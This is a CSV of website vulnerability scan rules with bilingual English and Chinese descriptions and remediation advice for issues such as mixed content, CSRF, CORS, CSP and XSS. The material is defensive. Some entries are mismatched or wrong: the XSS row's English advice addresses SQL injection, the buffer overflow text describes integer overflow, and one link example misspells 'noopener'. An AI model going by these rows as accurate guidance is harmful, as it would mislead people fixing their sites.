id,type,origin,enabled,risk,cost,name_en,name_zh,desc_en,desc_zh,advice_en,advice_zh
10040,A4,Secure Pages Include Mixed Content,TRUE,Low,Medium,Mixed HTTP and HTTPS content,混合 HTTP HTTPS 內容,"We detected that your website contains mixed HTTP and HTTPS content. As a result, an attacker can intercept and rewrite content, thereby taking full control of your page or even your entire website. This allows the attacker to modify the page, including displaying entirely different content, stealing user passwords or other login credentials, stealing user session cookies, or redirecting the user to a different site entirely. Mixed content occurs when the initial HTML is loaded over a secure HTTPS connection, but other resources (such as images, videos, stylesheets, scripts) are loaded over an insecure HTTP connection. This is called mixed content because both HTTP and HTTPS content are being loaded to display the same page, and the initial request was secure over HTTPS.",檢測到您的網站有HTTP與HTTPS混合內容的風險。例如攻擊者可以攔截和重寫內容，從而完全控制您的頁面甚至整個網站。 甚至攻擊者可以修改頁面，包括顯示完全不同的內容，竊取用戶密碼或登錄憑證，竊取用戶Session Cookie或將用戶完全重導向到其他站點。 由於這種威脅的嚴重性，默認情況下，大多數瀏覽器已經阻止了此類內容以保護用戶。 當以安全的HTTPS載入初始HTML，但通過不安全的HTTP加載其他資源（例如圖像，視頻，樣式表，腳本）時，就會發生混合內容，但因為初始請求通過HTTPS是安全的，導致該內容可以通過審查。,"• The best strategy to avoid mixed content blocking is to serve all the content as HTTPS instead of HTTP. A page that is available over SSL/TLS must be comprised completely of content which is transmitted over SSL/TLS. 
• For your own domain, serve all content as HTTPS and fix your links. 
• HTTP Strict Transport Security (HSTS) is a mechanism that enforces secure resource retrieval, even in the face of user mistakes (attempting to access your web site on port 80) and implementation errors (your developers place an insecure link into a secure page). 
• Content Security Policy (CSP) can be used to block insecure resource retrieval from third-party web sites. 
• Use 'protocol relative URLs' to have the user's browser automatically choose HTTP or HTTPS as appropriate, such as '<script type=""""text/javascript"""" src=""""//example.com/code.js""""></script>'","• 避免混合內容導致的安全疑慮，最佳的策略是將所有內容作為HTTPS而不是HTTP。 
• 通過SSL / TLS可用的頁面必須完全包含通過SSL / TLS傳輸的內容。
• 對於您自己的域，將所有內容用作HTTPS並修復連接。
• HTTP嚴格傳輸安全性（HSTS）是一種強制執行安全資源檢索的機制，可以防止用戶錯誤（試圖通過端口80訪問您的網站）和實現錯誤（您的開發人員將不安全的連接放置到安全頁面中）產生的安全風險。 
• 內容安全策略（CSP）可用於阻止從第三方網站檢索不安全的資源 。
• 使用“protocol relative URLs”使用戶的瀏覽器根據需要自動選擇HTTP或HTTPS，例如 '<script type=""""""""text/javascript"""""""" src=""""""""//example.com/code.js""""""""></script>'。"""
10041,A2,HTTP to HTTPS Insecure Transition in Form Post,TRUE,Medium,Low,HTTPS form in insecure HTTP page,不安全的表單提交（HTTP含HTTPS）,"We detected that your website serves HTTPS forms from an insecure HTTP page. This page could be hijacked using a Man-in-the-middle attack in which an attacker can replace or spoof the form target. If this page contains sensitive information, the attack may result in credential theft, data leakage, victim impersonation, and phishing attempts.",檢測到您網站中此HTTPS表單是從不安全的HTTP頁面提供的，可能會產生安全疑慮。 例如當訂購表單中的資料含機敏資訊時會導致機敏資訊的洩漏，此外也可能導致攻擊者竄改此表單的內容將送件地址改為攻擊者接收。 此風險是因為攻擊者基於HTTP頁面未加密內容的風險而使用中間人攻擊來劫持此頁面，替換或欺騙表單的目標。,"• The form should be served from a secure HTTPS page. 
• Configure the site to use HTTPS and ensure all assets are loaded over HTTPS.","• 表單內容都應從安全的HTTPS頁面提供。 
• 配置站點使用HTTPS，並確保所有資源都是通過HTTPS加密傳輸。"
10042,A2,HTTPS to HTTP Insecure Transition in Form Post,TRUE,Medium,Medium,Insecure HTTP form in HTTPS page,不安全的表單提交（HTTPS含HTTP）,"We detected that your website serves insecure HTTP forms from a HTTPS page, meaning that a secure page is transitioning to an insecure page when data is uploaded through a form. This page could be hijacked using a Man-in-the-middle attack in which an attacker can replace or spoof the form target. If this page contains sensitive information, the attack may result in credential theft, data leakage, victim impersonation, and phishing attempts. The user may think they're submitting data to a secure page when in fact their data is not encrypted.",檢測到您網站中此HTTPS頁面中有不安全的HTTP表單的，這可能會產生安全風險。 例如當訂購表單中的資料含機敏資訊時會導致機敏資訊的洩漏，此外也可能導致攻擊者竄改此表單的內容將送件地址改為攻擊者接收。 此風險是因為攻擊者基於HTTP表單未加密內容的風險而使用中間人攻擊來劫持此頁面，替換或欺騙表單的目標。 因HTTPS頁面中包含不安全的HTTP表單，這表示客戶通過表單上傳數據時，用戶可能認為他們正在向安全頁面提交數據，而實際上他們的數據未加密 ,"• The form target should point to a secure HTTPS page. 
• Configure HTTPS for all HTTP POST request within the web application to ensure communication of data over encrypted channel for security.","• 表單目標應指向安全的HTTPS頁面。 
• 為Web應用程序中的所有HTTP POST請求配置HTTPS，以確保所有資源都是通過HTTPS加密傳輸。"
10043,A3,User Controllable JavaScript Event (XSS),TRUE,,,,,,,,
10044,A1,Big Redirect Detected (Potential Sensitive Information Leak),TRUE,Low,Low,Redirect Response with Large Body Content,重導向回覆包含大量資訊,"The server has responded with a redirect that seems to provide a large response. This may indicate that although the server sent a redirect it also responded with body content (which may include sensitive details, PII, etc.).",檢測到您的網站執行導頁時有過多網頁回應，可能讓您的網站在過程中洩漏較敏感資訊或是個人資訊，這些信息可能會導致進一步針對內部系統的攻擊（例如列舉帳號或是釣魚社交工程）。,•Ensure that no sensitive information is leaked via redirect responses. Redirect responses should have almost no content.,• 依據報告檢查並刪除網頁回應中較敏感資訊，如系統資訊或是個人敏感資訊。
10045,A5,Source Code Disclosure - /WEB-INF folder,TRUE,,,,,,,,
10047,A4,HTTPS Content Available via HTTP,TRUE,Low,Low,HTTPS Content Available via HTTP,,,,,
10048,A3,Remote Code Execution - Shell Shock,TRUE,,,,,,,,
10050,Other,Retrieved from Cache,TRUE,,,,,,,,
10051,A3,Relative Path Confusion,TRUE,,,,,,,,
10052,A1,X-ChromeLogger-Data (XCOLD) Header Information Leak,TRUE,,,,,,,,
10054,A1,Cookie without SameSite Attribute,TRUE,Low,Low,Misconfigured Cookie： Missing SameSite Attribute,標頭配置錯誤（缺少SameSite屬性）,"A cookie has been set without the SameSite attribute, which means  that the cookie can be sent as a result of a ‘cross-site’ request. The SameSite attribute is an effective counter measure to cross-site request forgery, cross-site script inclusion, and timing attacks.",檢測到您的網站在標頭中缺少SameSite屬性，該屬性可用來阻止瀏覽器將Cookies 跨網站發送。 主要是用以減少跨網站信息洩漏的風險，並針對跨網站偽造要求的攻擊(cross-site request forgery attacks)作保護。,•Ensure that the SameSite attribute is set to either 'lax' or ideally 'strict' for all cookies.,• SameSite有三個數值 — Strict、Lax和None建議依據網站需求參考Strict＆Lax進行設定Strict Strict的要求最為嚴格，完全禁止第三方Cookies，只有當前網頁的 URL與請求目標一致，才會送出Cookie。 這個規則非常嚴格，適合用於銀行需要交易的網站中，保障客戶資料的安全。Lax Lax的要求則較為寬鬆，大多數情況也是不發送Cookie到第三方 ，但是Get請求除外。 這是一個平衡網路安全和使用者體驗的做法。由於Cookies可以跨網站發送，而風險較高的要求，例如POST，在Lax的設定下將會被禁止，阻止cross-site request forgery attacks 進行。
10055,A5,CSP,TRUE,Low,Low,Misconfigured Headers： CSP,標頭配置錯誤（CSP）,"CSP is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. Covered types are JavaScript, CSS, HTML frames, fonts, images and embeddable objects such as Java applets, ActiveX, audio and video files.","檢測到您的網站未最佳化CSP安全性設定。
內容安全策略（CSP）是附加性的安全措施，有助於檢測和緩解某些類型的攻擊，包括跨域腳本攻擊（XSS）和數據注入攻擊。 CSP提供了一組標準HTTP標頭，允許網站所有者聲明允許瀏覽器在該頁面上加載的已批准內容來源-涵蓋的類型包括JavaScript，CSS，HTML框架，字體，圖像和可嵌入對象，例如Java applet，ActiveX，音頻和視頻文件。","• To prevent the use of 'unsafe-inline' but still use inline scripts and styles on a page, consider converting them to safe sources via nonces or hashes. 
• For example, using the nonce-source you may specify inline style blocks with： """"Content-Security-Policy： style-src 'nonce-2726c7f26c'"""" and set the same nonce on the style element： '<style nonce=""""2726c7f26c""""> #inline-style { background： red; } </style>' • Hash-source inline styles can be achieved similarly.","• 限制外部連入的檔案和禁用inline語法，這是預設全部阻擋的寫法，也是最嚴格最安全的方案，設定範例如下
content-security-policy: default-src 'none';
• 增加外部連入的白名單，限制外部連入的來源，請避免在來源url中使用「*」，設定範例如下
content-security-policy: default-src 'none'; 
script-src 'self' https://www.google.com;
• 避免在CSP設定中使用「unsafe-inline」"
10056,A1,X-Debug-Token Information Leak,TRUE,,,,,,,,
10057,A1,Username Hash Found,TRUE,,,,,,,,
10058,A5,GET for POST,TRUE,,,,,,,,
10061,A1,X-AspNet-Version Response Header,TRUE,Low,Low,Header Leakage： X-AspNet-Version,標頭資訊洩露（X-AspNet-Version）,"We discovered that your website leaks technology information in the 'Server' header. This vulnerability may disclose the ASP.NET version and type of the backend server, allowing the attacker to fingerprint the site's technologies and pinpoint potential vulnerabilities in outdated software. An attacker may leverage this knowledge to attack your website when a new vulerability is released in the future.",檢測到您的網站在標頭中洩漏X-AspNet-Version信息，該信息可能會洩露後端伺服器資訊以及ASP.NET版本，造成安全風險。攻擊者可比照各種軟韌體版本資訊找出過期或未修補的系統，進而滲透利用。即使當前版本安全，未來若此版本有新漏洞釋出，您的網站可能因洩漏此資訊而在短時間內遭到攻擊。,"Remove the X-AspNet-Version HTTP header. To configure this 
on Apache： Add this line in httpd.conf： Header unset X-AspNet-Version To configure this on nginx： Add this line in the location section in nginx.conf： proxy_hide_header X-AspNet-Version; To configure this on IIS： In the Application_PreSendRequestHeaders() function in Global.asax, add the folowing： response.Headers.remove(""""X-AspNet-Version"""") To configure this in HAProxy： Add the following line to HAProxy's config： http-response del-header X-AspNet-Version","• 移除X-AspNet-Version標頭。 
• 設定Apache 在 httpd.conf中加入一行：Header unset X-AspNet-Version
• 設定nginx在 nginx.conf的location區段中加入一行：proxy_hide_header X-AspNet-Version;
• 設定 IIS在Global.asax的 Application_PreSendRequestHeaders()裡加入一行：response.Headers.remove(""X-AspNet-Version"") 
• 設定HAProxy在HAProxy前端組態設定中加入一行： http-response del-header X-AspNet-Version。"
10062,A1,PII Disclosure,FALSE,,,PII Leakage,,,,,
10095,A4,Backup File Disclosure,TRUE,,,,,,,,
10096,A1,Timestamp Disclosure,FALSE,,,,,,,,
10097,A1,Hash Disclosure,FALSE,,,Hash Disclosure,,,,,
10098,A1,Cross-Domain Misconfiguration,TRUE,Low,Low,Misconfigured Headers： CORS,標頭配置錯誤（CORS）,"We detected that your website has misconfigured CORS headers.
 Due to a misconfigured 'Access-Control-Allow-Origin： *' header on the web server and third party resource loading in the webpage, the victim's browser may load malicious resources and execute harmful scripts. Impact includes credential theft, data leakage, and phishing attempts. Cross-Origin Resource Sharing (CORS) is an HTTP-header based mechanism that allows a server to indicate any other origins (domain, protocol, or port) than its own from which a browser should permit loading of resources. This helps restrict the loaded data to trusted sources and prevent the browser from loading malicious external content. Thus, setting a wildcard directive ('*') nulls the protection from CORS settings.",檢測到您的網站可能有會產生安全疑慮的CORS配置錯誤。常見於設置了「 Access-Control-Allow-Origin: *」，同時網頁引用的第三方網頁中包含XSS或CSRF程式碼，則會導致自身的網頁受到第三方網頁中的惡意程式攻擊。 跨域資源共享（CORS）是一種基於HTTP標頭的機制，它允許伺服器指示瀏覽器應允許加載的資源外的其他任何來源（域，協議或端口），若Web服務器上的“ Access-Control-Allow-Origin”標頭配置錯誤，可能會加載異常或惡意的Web瀏覽器數據。,"• If the application does not require cross-origin requests, check that no policy is set. 
• The 'Access-Control-Allow-Origin' header should never be set to '*' or 'null', unless the whole content of the application is made to be public. Always ensure that it allows the most specific and restrictive set of domains. ","• 如果應用程序不需要跨域請求，請關閉與跨域有關的設定，讓Web瀏覽器以更嚴格的方式實施同源限制。 
• 如需使用跨域請求，需指定來源網域且內容不可以包含「*」與「null」，以常見的網站伺服器Apache為例，請在httpd.conf中新增一行設定「Header set Access-Control-Allow-Origin ""example.com""」，其他網站伺服器請參考供應商的相關設定。"
10104,Other,User Agent Fuzzer,TRUE,,,,,,,,
10105,A7,Weak Authentication Method,TRUE,Medium,High,HTTP Basic/Digest Authentication,HTTP基本身份驗證,"We detected that your website uses HTTP Basic or Digest authentication over an unsecured connection. Consequences include credential theft and user impersonation. HTTP Basic Authentication utilizes simple ID/password pairs with no encryption, which makes it easy for an attacker to intercept login credentials, replay them to other hosts, and trick users into providing the credentials to the wrong location.",檢測到您的網站在不安全的連接上使用HTTP基本身份驗證，這可能會產生安全風險。 使攻擊者可以輕易的攔截登錄憑證，並將其憑證在其他主機重放，誘騙用戶將憑據提供給錯誤的位置。,"• Clearly identifies the host that is requesting authentication credentials 
• Only allows authentication over encrypted secure channel (HTTPS) 
• Does not allow authentication transactions to be replayed or authorization tokens to be reused 
• Does not allow cross-domain authentication requests by default. If cross-domain authentication is desired by a parent site, a white list of domains which are allowed to be authenticated should be defined by CSP or similar site policy. 
• Whitelist or proxy all inlined content in order to block malicious authentication requests 
• Keep the authentication token secure and set a short expiration time","• 清楚的標識正在請求身份驗證憑據的主機。 
• 僅允許通過加密的安全通道（HTTPS）進行身份驗證。 
• 不允許重放身份驗證或重複使用授權token。
• 默認情況下不允許跨域身份驗證請求，如果父站點需要跨域身份驗證，則應通過CSP或類似的站點策略定義允許進行身份驗證的域白名單。 
• 將所有內網內容列入白名單或代理，以阻止惡意身份驗證請求。 
• 確保身份驗證token的安全並設置較短的到期時間。"
10106,A4,HTTP Only Site,TRUE,,,,,,,,
10107,A3,Httpoxy - Proxy Header Misuse,TRUE,,,,,,,,
10108,A4,Reverse Tabnabbing,TRUE,High,Medium,Reverse Tabnabbing,逆向 Tabnabbing,,"檢測到您的網站有受到逆向Tabnabbing攻擊的可能性。​ 
如果用戶對該新頁面進行身份驗證，則其憑證（或其他敏感數據）將被發送到網路釣魚站點，而不是合法站點，使密碼遭竊，例如用釣魚網站替換網頁，但由於用戶最初是位於正確的網頁上，因此他們不太可能注意到最初的正確網頁在導頁後會變更為網路釣魚的站點，特別是該站點看起來與目標站點相同。​","• Add 'rel=""""noopener noreferrer""""' to every 'a'-element that has 'target=""""_blank""""'. 'noopener' ensures that the linked page does not have access to 'window.opener' from the linking page. 'noreferrer' makes sure that the request referrer header is not being sent. This is supported by most recent versions of modern browsers, with Internet Explorer being an exception. • If you are using JavaScript, the following achieves the same： 'var myNewWindow = window.open(url, name, """"noopener,noreferrer"""") myNewWindow.opener = null' 
• If you show user-generated content on your page you must sanitize the input and apply """"noopener noreferrer"""" to every link.","• 將html中所有用到開新視窗的跳轉連結加上noopener與noreferrer設定，以跳轉至google為例
<a href=""https://www.google.com"" target=""_blank"" rel=""noreferrer noopenner"">Google</a>
加上安全性設定後可以確保使用者當前瀏覽的頁面，不會因為開新視窗後被另開的這個網站給影響。
• 將javascript中所有用到開新視窗的跳轉連結加上noopener與noreferrer設定，以跳轉至google為例
window.open('https://www.google.com', '_blank', 'noopener,noreferrer')
加上安全性設定後可以確保使用者當前瀏覽的頁面，不會因為開新視窗後被另開的這個網站給影響。"
10109,Other,Modern Web Application,TRUE,,,,,,,,
10202,A1,Absence of Anti-CSRF Tokens,TRUE,Low,High,Missing Anti-CSRF Ttokens,缺少CSRF Token,"We detected that your website is missing anti-CSRF tokens. A cross-site request forgery(CSRF) is an attack that involves spoofing a victim's authenticated session to perform sensitive actions, such as making a payment or transfer of funds without the victim's knowledge.
 This may result in financial loss, credential theft, and other information disclosure. CSRF attacks are effective in a number of situations including：
• The victim has an active session on the target site. 
• The victim is authenticated via http auth on the target site. 
• The victim is on the same local network as the target site.
 Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.","檢測到您的網站缺少CSRF Tokens，可能會導致跨站點請求偽造攻擊(CSRF)。​ 此攻擊會導致攻擊者以使用者名義發送郵件、消息，盜取帳號，甚至於購買商品，虛擬貨幣轉帳等，使個人隱私洩露以及財產受到損害。 CSRF是一種誘使使用者在他們不知道的情況發送http請求到目標網站，在許多情況下有效，包括：
•受害者在目標站點上進行活動的session。 
•通過目標站點上的http auth對受害者進行身份驗證。 
•受害人與目標站點位於同源網路上。
 CSRF可以在同源策略的範圍內進行，主要用於使用受害人權限對目標站點執行操作。","• Use a vetted library or framework that provides constructs that make this weakness easier to avoid. For example, use anti-CSRF packages such as the OWASP csrfguard. 
• Generate a unique nonce for each form and place the nonce into the form and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable.
• Identify especially dangerous operations, such as financial actions and account changes, and send a separate confirmation request to ensure that the user intended to perform that operation. 
• Use the esapi session management control, which includes a component for CSRF.
• Do not use the get method for any request that triggers a state change.
• Check the http referer header to see if the request originated from an expected page. ","• 為每個表單生成唯一且不可預測的隨機數，將隨機數放入表單，並在收到表單後對隨機數進行驗證。​
• 為了要避免CSRF 攻擊，建議在每階段架構和設計時，使用經過審查的套件或框架。
• 使用Anti-CSRF套件，例如owasp csrfguard。​
• 使用esapi session管理套件管理session， 避免使用任何會觸發狀態更改請求的get method。
• 檢查http引用標頭以查看該請求是否源自預期的頁面。"
20012,A1,Anti-CSRF Tokens Check,TRUE,Medium,High,Missing Anti-CSRF Tokens,缺少CSRF Token,"We detected that your website is missing anti-CSRF tokens. A cross-site request forgery(CSRF) is an attack that involves spoofing a victim's authenticated session to perform sensitive actions, such as making a payment or transfer of funds without the victim's knowledge.
 This may result in financial loss, credential theft, and other information disclosure. CSRF attacks are effective in a number of situations including：
• The victim has an active session on the target site. 
• The victim is authenticated via http auth on the target site. 
• The victim is on the same local network as the target site.
 Cross-site request forgery is also known as CSRF, XSRF, one-click attack, session riding, confused deputy, and sea surf.","檢測到您的網站缺少CSRF Tokens，可能會導致跨站點請求偽造攻擊(CSRF)。​ 此攻擊會導致攻擊者以使用者名義發送郵件、消息，盜取帳號，甚至於購買商品，虛擬貨幣轉帳等，使個人隱私洩露以及財產受到損害。 CSRF是一種誘使使用者在他們不知道的情況發送http請求到目標網站，在許多情況下有效，包括：
•受害者在目標站點上進行活動的session。 
•通過目標站點上的http auth對受害者進行身份驗證。 
•受害人與目標站點位於同源網路上。
 CSRF可以在同源策略的範圍內進行，主要用於使用受害人權限對目標站點執行操作。","• Use a vetted library or framework that provides constructs that make this weakness easier to avoid. For example, use anti-CSRF packages such as the OWASP csrfguard. 
• Generate a unique nonce for each form and place the nonce into the form and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable.
• Identify especially dangerous operations, such as financial actions and account changes, and send a separate confirmation request to ensure that the user intended to perform that operation. 
• Use the esapi session management control, which includes a component for CSRF.
• Do not use the get method for any request that triggers a state change.
• Check the http referer header to see if the request originated from an expected page. ","• 為每個表單生成唯一且不可預測的隨機數，將隨機數放入表單，並在收到表單後對隨機數進行驗證。​
• 為了要避免CSRF 攻擊，建議在每階段架構和設計時，使用經過審查的套件或框架。
• 使用Anti-CSRF套件，例如owasp csrfguard。​
• 使用esapi session管理套件管理session， 避免使用任何會觸發狀態更改請求的get method。
• 檢查http引用標頭以查看該請求是否源自預期的頁面。"
20014,A3,HTTP Parameter Pollution,TRUE,,,,,,,,
20015,A4,Heartbleed OpenSSL Vulnerability,TRUE,,,,,,,,
20016,A1,Cross-Domain Misconfiguration,TRUE,,,,,,,,
20017,A3,Source Code Disclosure - CVE-2012-1823,TRUE,,,,,,,,
20018,A3,Remote Code Execution - CVE-2012-1823,TRUE,,,,,,,,
20019,A1,External Redirect,TRUE,,,,,,,,
30001,Other,Buffer Overflow,TRUE,Medium,Medium,Buffer Overflow,緩衝區溢位,"We have detected that your program returns an error when an 
unusually large value has been submitted, which potentially indicates an integer overflow error. This vulnerability may cause a service to crash, resulting in service interruption, or worse, may allow an attacker to hijack the execution flow of the program and obtain access to the underlying system. Consequently, an attacker may achieve remote code execution and gain high privileged access, taking control over the system. An integer overflow condition exists when an integer, which has not been sufficiently validated from the input stream, is used within a program.",檢測到您的網站當提交異常大的值時，程序將返回錯誤，這可能代表緩衝區溢位的風險。 存在此漏洞是因為程序沒有充分驗證用戶輸入值，例如未設定可輸入字元使攻擊者可以輸入任意長度值，導致系統出錯進而發生服務崩潰、服務中斷，或允許攻擊者劫持程序的執行並獲得對基礎系統的訪問，使攻擊者獲得遠程代碼執行並獲得高特權訪問，從而控制了系統。 當在程序中未使用正確的輸入檢查，便可能導致存在緩衝區溢位。,•Rewrite the background program using proper checking of the size  of user input integers to prevent overflows and divide by 0 errors.,"• 建議在後端程序建立嚴格的輸入檢查來防止緩衝區溢位，常見方法為對欄位最大長度進行限制。
• 後台建立完整的例外處理機制，防止攻擊者利用緩衝區中斷系統服務。"
30002,Other,Format String Error,TRUE,Medium,Low,Format String Error,格式字符串攻擊,"We have detected that your program returns an error when a string  with formatting characters has been submitted, which potentially indicates a format string exploit. This vulnerability may cause a service to crash, resulting in service interruption, or worse, may allow an attacker to hijack the execution flow of the program and obtain access to the underlying system. Consequently, an attacker may achieve remote code execution and gain high privileged access, taking control over the system. The Format String error occurs when the submitted data of an input string has not been sufficiently validate and is thus evaluated as a command by the application.",檢測到您的網站在帶有格式字符的字符串時，程序將導至錯誤頁面，表示格式字符串有被利用的風險進而發生安全風險。​ 這可能導致服務崩潰中斷或是因錯誤頁面中斷登入程序而使攻擊者劫持了登入程序的執行流程，獲得對系統內容的存取，導致攻擊者獲得遠程代碼執行或獲得是高特權權限從而控制系統。 ​ 存在此漏洞是因為程序沒有充分驗證用戶輸入字符串，當應用程序輸入字符串提交作為指令時，就會發生Format String攻擊。,"• Always specify a format string as part of program, not as an input. Most format string vulnerabilities are solved by specifying “%s” as format string and not using the data string as format string. • If possible, make the format string a constant. Extract all the variable parts as other arguments to the call. • Rewrite the background program using proper deletion of bad character strings. This will require a recompile of the background executable.","• 將格式字符串在程序中設定來限制輸入。 例如將“％s”指定為格式字符串。 
• 如果可能，將格式字符串設置為常數，變數以其他參數儲存。 
• 重新編譯後端可執行文件，避免不良的字符串規則。"
30003,Other,Integer Overflow Error,TRUE,Medium,Medium,Buffer Overflow： Integer Overflow,緩衝區溢位（整數溢位）,"We have detected that your program returns an error when an unusually large value has been submitted, which potentially indicates an integer overflow error. This vulnerability may cause a service to crash, resulting in service interruption, or worse, may allow an attacker to hijack the execution flow of the program and obtain access to the underlying system. Consequently, an attacker may achieve remote code execution and gain high privileged access, taking control over the system. An integer overflow condition exists when an integer, which has not been sufficiently validated from the input stream, is used within a program.",檢測到您的網站當提交異常大的值時，程序將返回錯誤，這可能代表緩衝區溢位的風險。 存在此漏洞是因為程序沒有充分驗證用戶輸入值，例如未設定可輸入字元使攻擊者可以輸入任意長度值，導致系統出錯進而發生服務崩潰、服務中斷，或允許攻擊者劫持程序的執行並獲得對基礎系統的訪問，使攻擊者獲得遠程代碼執行並獲得高特權訪問，從而控制了系統。 當在程序中未使用正確的輸入檢查，便可能導致存在緩衝區溢位。,•Rewrite the background program using proper checking of the size of user input integers to prevent overflows and divide by 0 errors.,"• 建議在後端程序建立嚴格的輸入檢查來防止緩衝區溢
位，一般狀況下建議將欄位長度限制到僅能輸入20個以下的字元。"
40003,A3,CRLF Injection,TRUE,,,,,,,,
40008,A4,Parameter Tampering,TRUE,,,,,,,,
40009,A3,Server Side Include,TRUE,,,,,,,,
40012,A3,Cross Site Scripting (Reflected),TRUE,High,Medium,Cross Site Scripting (XSS),跨域腳本攻擊,"We detected that your website has cross site scripting (XSS) vulnerabilities. XSS works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application. For example, if a website includes user input in its source code, but does not perform any input validation, then an attacker may use a phishing attempt to lure a victim to click on a link that includes malicious parameters in order to execute malicious code in the victim's browser. As a result, the attacker may compromise the victim's account by stealing the cookies and other personal information. This attack is also known as Reflected XSS.","檢測到您的網站可能有跨域腳本攻擊的安全風險。
該問題常見於沒有限制數字、符號、特殊字元等不合理輸入的網頁，導致輸入程式碼時被瀏覽器解析並執行，此時駭客可以構造帶有竊取用戶帳密程式碼的惡意連結，透過釣魚攻擊傳送給用戶，若用戶點擊此連結，便會載入此頁面，觸發惡意程式將自己的資訊傳送給駭客。如果駭客透過誘使用戶載入惡意程式來觸發跨域腳本攻擊，稱之為反射型的跨域腳本攻擊。","• Perform input validation on all data using, for example, regular expressions perform other checks.
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied.
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","• 做好輸入驗證與檢查，不論是前後端都應假設輸入都是惡意且不可信任的 。
• 應確認每個輸入欄位是否為合理的資料類型與內容，例如年齡的欄位在文法上應只接受0-9的數字，而語意上應確認此數字介於 0-120。 
• 任何輸入，尤其是難以定義文法的自由格式，都應經由編碼轉義為純字符串來處理，防止此內容被視為程式碼執行。許多程式框架都有提供內建編碼函式庫，可多加利用。 
• 絕對不要將使用者輸入放入 <script>、註解、屬性名稱、標籤名稱、內聯事件監聽器等，因為這些位置都能將字符串作為程式碼運行 。
• 對cookie設定HttpOnly的屬性，確保程式碼沒有存取權 
• 設定X-XSS-Protection：0的標頭 
• 設定內容安全策略（CSP）的標頭，可明確定義允許瀏覽器在該頁面上加載的內容來源，涵蓋的類型包括JavaScript，CSS，HTML框架，字體，圖像和可嵌入對象，例如Java applet，ActiveX，影音文件"""
